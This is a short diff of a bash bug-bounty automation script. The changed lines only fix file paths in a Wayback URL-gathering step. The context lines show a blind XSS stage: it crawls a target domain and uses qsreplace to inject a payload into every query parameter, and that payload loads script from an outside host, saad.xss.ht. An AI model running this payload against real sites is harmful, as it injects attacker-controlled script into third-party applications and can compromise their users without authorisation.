@@ -54,15 +54,15 @@ echo -e "BLIND XSS \n"
 gospider -S $1 -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep --color=auto "https://" | grep --color=auto "=" | qsreplace '&"><script src=https://saad.xss.ht></script>'
 
 echo -e "WAYBACK \n"
-
-sigurlfind3r -d $1 -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q $1/way_output
+mkdir $1
+sigurlfind3r -d $1 -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q $1/way_output.txt
 #------------------------------------------------#
 echo -e "REMOVE DUB \n"
 
-cat way_output.txt | urldedupe -s | anew -q $1/parameters.txt
+cat $1/way_output.txt | urldedupe -s | anew -q $1/parameters.txt
 
 echo -e "handle it \n"
-rm way_output
+rm $1/way_output.txt
 #------------------------------------------------#
 echo -e "REFLECTED XSS \n"
 #------------------------------------------------#
